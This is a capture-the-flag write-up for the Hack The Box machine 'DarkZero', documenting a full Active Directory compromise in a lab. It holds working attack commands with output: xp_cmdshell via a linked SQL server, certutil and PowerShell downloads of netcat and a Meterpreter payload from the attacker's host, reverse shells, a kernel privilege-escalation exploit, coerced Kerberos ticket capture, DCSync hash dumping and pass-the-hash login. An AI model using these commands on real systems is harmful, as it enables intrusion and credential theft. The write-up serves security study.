# DarkZero Writeup - Hack The Box

## Box Information
- **Name:** DarkZero
- **Difficulty:** Hard
---

## Table of Contents
1. [Initial Access](#initial-access)
2. [SQL Server Enumeration](#sql-server-enumeration)
3. [Linked Server Exploitation](#linked-server-exploitation)
4. [Initial Foothold on DC02](#initial-foothold-on-dc02)
5. [Privilege Escalation to SYSTEM](#privilege-escalation-to-system)
6. [Credential Harvesting](#credential-harvesting)
7. [Domain Trust Enumeration](#domain-trust-enumeration)
8. [Kerberos Ticket Capture](#kerberos-ticket-capture)
9. [DCSync Attack](#dcsync-attack)
10. [Flags](#flags)

---

## Initial Access

### Provided Credentials
The box starts with provided credentials:
- **Username:** `john.w`
- **Password:** `RFulUtONCOL!`

### Initial Reconnaissance
First, let's scan the target to see what services are available:

```bash
nmap -sS -sCV --open -p- --min-rate 5000 -n -Pn -oN escaneo.txt 10.129.6.143
```

**Findings:**
- **53/tcp** - DNS (Simple DNS Plus)
- **88/tcp** - Kerberos (Active Directory)
- **135/tcp** - MSRPC
- **139/tcp** - NetBIOS
- **389/tcp** - LDAP (Domain: darkzero.htb)
- **445/tcp** - SMB
- **1433/tcp** - Microsoft SQL Server 2022
- **5985/tcp** - WinRM (HTTP)
- **9389/tcp** - .NET Message Framing

Key discovery: **SQL Server is exposed on port 1433** - this will be our entry point.

---

## SQL Server Enumeration

### Connecting to MSSQL
Using the provided credentials, we connect to the SQL server:

```bash
impacket-mssqlclient john.w@DC01.darkzero.htb -windows-auth
```

```
Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)>
```

### Enumerating Linked Servers
The most critical discovery is checking for linked server configurations:

```sql
enum_links
```

**Output:**
```
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      
DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   
```

**Key finding:** There's a linked server to `DC02.darkzero.ext` that maps our user `john.w` to `dc01_sql_svc` on the remote server.

---

## Linked Server Exploitation

### Enabling Advanced Options
We can execute commands on the linked server using the `AT` syntax:

```sql
EXEC('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
```

**Response:**
```
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

### Enabling xp_cmdshell
```sql
EXEC('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
```

**Response:**
```
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

### Verifying Command Execution
```sql
EXEC('xp_cmdshell ''whoami''') AT [DC02.darkzero.ext]
```

**Output:**
```
output                 
--------------------   
darkzero-ext\svc_sql   
NULL
```

**Success!** We're running as `svc_sql` on DC02.

---

## Initial Foothold on DC02

### Setting Up HTTP Server for File Transfer
On our attack machine:

```bash
cd /tmp
wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O nc.exe
python3 -m http.server 80
```

### Downloading Netcat to DC02
```sql
EXEC('xp_cmdshell ''certutil -urlcache -f http://10.10.15.240/nc.exe C:\Windows\Temp\nc.exe''') AT [DC02.darkzero.ext]
```

**Response:**
```
output                                                
---------------------------------------------------   
****  Online  ****                                    
CertUtil: -URLCache command completed successfully.   
NULL
```

### Setting Up Listener
```bash
nc -lvnp 4444
```

### Executing Reverse Shell
```sql
EXEC('xp_cmdshell ''C:\Windows\Temp\nc.exe 10.10.15.240 4444 -e cmd''') AT [DC02.darkzero.ext]
```

**Shell Received:**
```
listening on [any] 4444 ...
connect to [10.10.15.240] from (UNKNOWN) [10.129.6.143] 65008
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

---

## Privilege Escalation to SYSTEM

### Using Metasploit for Better Payload
Instead of a basic reverse shell, let's use Meterpreter for better capabilities:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.240 LPORT=4444 -f exe -o shell.exe
python3 -m http.server 80
```

### Download and Execute Meterpreter
```sql
EXEC ('xp_cmdshell ''powershell -Command "Invoke-WebRequest -Uri http://10.10.15.240/shell.exe -OutFile C:\Users\Public\shell.exe"''') AT [DC02.darkzero.ext];
EXEC ('xp_cmdshell ''C:\Users\Public\shell.exe''') AT [DC02.darkzero.ext];
```

### Metasploit Handler
```bash
msfconsole -q
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.15.240
msf exploit(multi/handler) > set LPORT 4444
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.15.240:4444 
[*] Sending stage (232006 bytes) to 10.129.6.143
[*] Meterpreter session 1 opened (10.10.15.240:4444 -> 10.129.6.143:64973)
```

### Using Exploit Suggester
```msf
meterpreter > background
msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(local_exploit_suggester) > set SESSION 1
msf post(local_exploit_suggester) > run
```

**Identified vulnerability:** `CVE-2024-30088` - Windows Kernel Elevation of Privilege Vulnerability

### Exploiting to SYSTEM
```msf
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > set SESSION 1
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > run

[*] Started reverse TCP handler on 10.10.16.20:4444 
[*] Running automatic check
[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[*] Reflectively injecting the DLL into 6176...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 608
[+] Successfully retrieved winlogon pid: 612
[*] Sending stage (203846 bytes) to 10.10.11.89
[*] Meterpreter session 3 opened
```

**We now have SYSTEM privileges on DC02!**

---

## Credential Harvesting

### Dumping Local Hashes
```msf
meterpreter > hashdump
```

**Output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:4276fdf209008f4988fa8c33d65a2f94:::
```

### Downloading Tools for Further Enumeration
We need more tools for Kerberos attacks:

```bash
# Download Rubeus
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe

# Download Mimikatz
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
cp x64/mimikatz.exe .
```

### Transfer Tools to DC02
```sql
EXEC('xp_cmdshell ''certutil -urlcache -f http://10.10.15.240/Rubeus.exe C:\Users\Public\rubeus.exe''') AT [DC02.darkzero.ext]
EXEC('xp_cmdshell ''certutil -urlcache -f http://10.10.15.240/mimikatz.exe C:\Users\Public\mimikatz.exe''') AT [DC02.darkzero.ext]
```

---

## Domain Trust Enumeration

### Using PowerView to Enumerate Trusts
We need to understand the trust relationship between domains:

```bash
# Using powerview.py from Impacket
╭─LDAPS─[DC01.darkzero.htb]─[darkzero-ext\Administrator]-[NS:<auto>] [CACHED]
╰─PV ❯ Get-NetTrust
```

**Output:**
```
objectClass                   : top
                                leaf
                                trustedDomain
name                          : darkzero.ext
securityIdentifier            : S-1-5-21-1969715525-31638512-2552845157
trustDirection                : INBOUND
                                OUTBOUND
                                BIDIRECTIONAL
trustPartner                  : darkzero.ext
trustType                     : WINDOWS_ACTIVE_DIRECTORY
                                MIT
trustAttributes               : FOREST_TRANSITIVE
                                CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION
flatName                      : darkzero-ext
```

**Critical finding:** The `ENABLE_TGT_DELEGATION` flag is set, which means we can potentially capture TGTs across the trust!

---

## Kerberos Ticket Capture

### Setting Up SpoolSample for Coercion
First, we need to compile SpoolSample to force authentication:

```bash
# Install mono for C# compilation
sudo apt update
sudo apt install -y mono-mcs mono-complete

# Clone and compile SpoolSample
git clone https://github.com/leechristensen/SpoolSample.git
cd SpoolSample
csc /target:exe /out:SpoolSample.exe SpoolSample/*.cs
```

### Starting Rubeus in Monitor Mode on DC02
From our SYSTEM shell on DC02:

```powershell
PS C:\Users\Public> .\rubeus.exe monitor /interval:5 /nowrap
```

**Output:**
```
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs
```

### Coercing Authentication from DC01
In another terminal, run SpoolSample:

```bash
./SpoolSample.exe DC01.darkzero.htb DC02.darkzero.ext
```

### Capturing the TGT
Rubeus captures the TGT from DC01:

```
[*] 10/5/2025 11:25:25 PM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/5/2025 2:06:22 PM
  EndTime               :  10/6/2025 12:06:20 AM
  RenewTill             :  10/12/2025 2:06:20 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZT3UFtLPB4JgC3QH2e6BZFq9xYVoXdyrFoFkKLuox3JwDHDPB/3la8Z+5ZmEqHJWASBeuhMlog5zmxAwSTk8CDMyaHqH4FDRYaffJsvzZg9PG6oCh4XL/70vz7b5u/kRn9I93dPD5FH6X2yxW5FE31mQQPpIbrY7Zk4y702jwZJdbyT6SMkSa5JQTSE0CLwK6eFp6UI3nCsu+mK8KlQcy60ZVTF7OWWXdiQU2cVhOWF0LVEPQkRDDX4S6Ykx8lgIIlv7+ALJdxV+2mSaqyBxpwM6p/PjD6D6R7kVHPRczbHG/ncZi+a1bhMCDS01p4/JWot5+XypHIoccep7cd8VHY/Uz0KR+egMHMXp3mqNQ0Ka8aJvlP2wuXOK5hj5SKXotYODfwxs1YTcFeaSZ5oFE/oao7R/ZebTgNZCX+RUPOedXOfjjXIM5gXODRZi0PgbdriR7Cpt0NVoRUhlNgDvHsKOB4FPZDv5Qlo42CquJNPztDzYjzQo04lk+8J74UYmSFaPxwY0pDbV7p1CSr69D8BnrIa8oTId7ceInGae1A13vAgrbcAEDqU8FJ2Oc52Tm5bEQTvB6dqZWNMuwtKX7mEqAgiRKTEs4YuCFWJGD8QfNaKYHOhOuv4ZWFXqT72u9Xl9eiaxCoPYh4pBQ2quBL7OzGFQJ+LyRgLCtOeH323CQq49xrqge5CQKoYgiyy0UZoP8dOo03fHYv5x1WZCJk7Bgs3EoJnYoKXjK7OKgTT4slpG53j/7jV94Yv8p8ZGWnmkV9UTRf1CzpmcLkUDIzHAuQfBBJBt8hQsMEvM7uA56H8AnbcmjiW6E6Tlw68rQQGAbNzen/570JoJn7OekwkHWVijvQ1FKu0PDipnD+GB2s64tkmHh9S+Wr5khE6Kyh+gRd9ReRMD1rC4VE80PVRxDO4DzDgjPaFckl0xvVCR/ehpXc2YPh1wjNyjlU1/FG9V1XaY8mTQ5FzZxxvEYl5q2s/T3sl5opGssVvx1/32sLiCh0h/Uxgqe2HNT/sX9CdNhnd9tukWwql4H6QzzNnj6eAM8Tl1rKKCvTkoYN3tdrM/kpCbIazUN5jeVS7ZYijjlkLaL6Pz2LBWdKzIlrW1U/ORWp1rwhqhnHW6erd/Z7IhE3cFX5rjUhTlLnbYjAtZkwWzid7n6QNAoxoHMcwBQv8bAtr5en1c1C4YRe8LfJzXHLgeLth3/CccTnT3NSqWywdNbaSxnmNPoBLzk6oCZBYk0VSUr842X6DJ5viBIS3x9T7tfhtPsFXVUfcw9pxtT/mVSWvJcxFYOSRHWBrkW/EOysq1cY9brLMqgzjMWkMGaDTw7HWz1rqMjDPr7FjLFfEdRBNAVeCDPWeqGpeM9ESCPKoOmd/gjARBeMxuQTJ32O/j78J0AhYDLe2Vyv7KLRZRfPMIFZS5I2Lq98nLVIWWeao4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQg/9QHbWsj0SaSchM/AMma5dadsamgnvAZzGeId1GnyNehDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDUyMTA2MjJaphEYDzIwMjUxMDA2MDcwNjIwWqcRGA8yMDI1MTAxMjIxMDYyMFqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=
```

---

## DCSync Attack

### Converting Ticket Format
We need to convert the captured ticket from base64 to .kirbi format, then to .ccache for Impacket:

```bash
# Save the base64 ticket to a file and decode
echo "doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZT3UFtLPB4JgC3QH2e6BZFq9xYVoXdyrFoFkKLuox3JwDHDPB/3la8Z+5ZmEqHJWASBeuhMlog5zmxAwSTk8CDMyaHqH4FDRYaffJsvzZg9PG6oCh4XL/70vz7b5u/kRn9I93dPD5FH6X2yxW5FE31mQQPpIbrY7Zk4y702jwZJdbyT6SMkSa5JQTSE0CLwK6eFp6UI3nCsu+mK8KlQcy60ZVTF7OWWXdiQU2cVhOWF0LVEPQkRDDX4S6Ykx8lgIIlv7+ALJdxV+2mSaqyBxpwM6p/PjD6D6R7kVHPRczbHG/ncZi+a1bhMCDS01p4/JWot5+XypHIoccep7cd8VHY/Uz0KR+egMHMXp3mqNQ0Ka8aJvlP2wuXOK5hj5SKXotYODfwxs1YTcFeaSZ5oFE/oao7R/ZebTgNZCX+RUPOedXOfjjXIM5gXODRZi0PgbdriR7Cpt0NVoRUhlNgDvHsKOB4FPZDv5Qlo42CquJNPztDzYjzQo04lk+8J74UYmSFaPxwY0pDbV7p1CSr69D8BnrIa8oTId7ceInGae1A13vAgrbcAEDqU8FJ2Oc52Tm5bEQTvB6dqZWNMuwtKX7mEqAgiRKTEs4YuCFWJGD8QfNaKYHOhOuv4ZWFXqT72u9Xl9eiaxCoPYh4pBQ2quBL7OzGFQJ+LyRgLCtOeH323CQq49xrqge5CQKoYgiyy0UZoP8dOo03fHYv5x1WZCJk7Bgs3EoJnYoKXjK7OKgTT4slpG53j/7jV94Yv8p8ZGWnmkV9UTRf1CzpmcLkUDIzHAuQfBBJBt8hQsMEvM7uA56H8AnbcmjiW6E6Tlw68rQQGAbNzen/570JoJn7OekwkHWVijvQ1FKu0PDipnD+GB2s64tkmHh9S+Wr5khE6Kyh+gRd9ReRMD1rC4VE80PVRxDO4DzDgjPaFckl0xvVCR/ehpXc2YPh1wjNyjlU1/FG9V1XaY8mTQ5FzZxxvEYl5q2s/T3sl5opGssVvx1/32sLiCh0h/Uxgqe2HNT/sX9CdNhnd9tukWwql4H6QzzNnj6eAM8Tl1rKKCvTkoYN3tdrM/kpCbIazUN5jeVS7ZYijjlkLaL6Pz2LBWdKzIlrW1U/ORWp1rwhqhnHW6erd/Z7IhE3cFX5rjUhTlLnbYjAtZkwWzid7n6QNAoxoHMcwBQv8bAtr5en1c1C4YRe8LfJzXHLgeLth3/CccTnT3NSqWywdNbaSxnmNPoBLzk6oCZBYk0VSUr842X6DJ5viBIS3x9T7tfhtPsFXVUfcw9pxtT/mVSWvJcxFYOSRHWBrkW/EOysq1cY9brLMqgzjMWkMGaDTw7HWz1rqMjDPr7FjLFfEdRBNAVeCDPWeqGpeM9ESCPKoOmd/gjARBeMxuQTJ32O/j78J0AhYDLe2Vyv7KLRZRfPMIFZS5I2Lq98nLVIWWeao4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQg/9QHbWsj0SaSchM/AMma5dadsamgnvAZzGeId1GnyNehDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDUyMTA2MjJaphEYDzIwMjUxMDA2MDcwNjIwWqcRGA8yMDI1MTAxMjIxMDYyMFqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=" | base64 -d > dc01.kirbi

# Convert kirbi to ccache format
impacket-ticketConverter dc01.kirbi dc01.ccache
```

**Output:**
```
[*] converting kirbi to ccache...
[+] done
```

### Performing DCSync with the Machine Account
Now we can use the machine account's TGT to perform a DCSync attack against the domain controller:

```bash
export KRB5CCNAME=dc01.ccache
impacket-secretsdump 'DC01$'@DC01.darkzero.htb -k -no-pass
```

**Output:**
```
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:95e4ba6219aced32642afa4661781d4b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
...
```

**Success!** We've dumped the domain hashes including the Administrator's NTLM hash.

---

## Flags

### Connecting via WinRM with Administrator Hash
Using the Administrator hash, we can connect via WinRM:

```bash
evil-winrm -i DC01.darkzero.htb -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726
```

### Retrieving Flags
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         10/5/2025   2:06 PM             34 root.txt
-ar---         10/5/2025   2:06 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
ca2f5f1a32[REDACTED]

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type user.txt
82db32d8[REDACTED]
```

---

## Attack Chain Summary

1. **Initial Access:** Provided credentials for `john.w`
2. **SQL Enumeration:** Discovered linked server to DC02
3. **Lateral Movement:** Enabled `xp_cmdshell` on DC02 via linked server
4. **Initial Shell:** Uploaded and executed reverse shell
5. **Privilege Escalation:** Used CVE-2024-30088 to get SYSTEM on DC02
6. **Credential Harvesting:** Dumped local hashes
7. **Trust Enumeration:** Discovered `ENABLE_TGT_DELEGATION` trust flag
8. **Ticket Capture:** Used SpoolSample + Rubeus to capture DC01's machine account TGT
9. **DCSync:** Used captured TGT to perform DCSync and dump domain hashes
10. **Domain Compromise:** Connected via WinRM as Administrator

---

## Key Tools Used
- **nmap** - Initial reconnaissance
- **impacket-mssqlclient** - SQL Server connection
- **Metasploit** - Exploit suggester and CVE-2024-30088
- **Rubeus** - Kerberos ticket monitoring and capture
- **SpoolSample** - Coerce authentication
- **impacket-ticketConverter** - Ticket format conversion
- **impacket-secretsdump** - DCSync attack
- **evil-winrm** - Final connection

---

## Lessons Learned

1. **Linked servers are dangerous** - They can provide a pivot point between systems
2. **Kerberos delegation flags matter** - `ENABLE_TGT_DELEGATION` allowed TGT capture
3. **Machine accounts are powerful** - With a machine account TGT, we could perform DCSync
4. **Always check trust relationships** - Cross-forest trusts can be exploited
5. **Defense in depth is critical** - Multiple layers of security could have prevented this
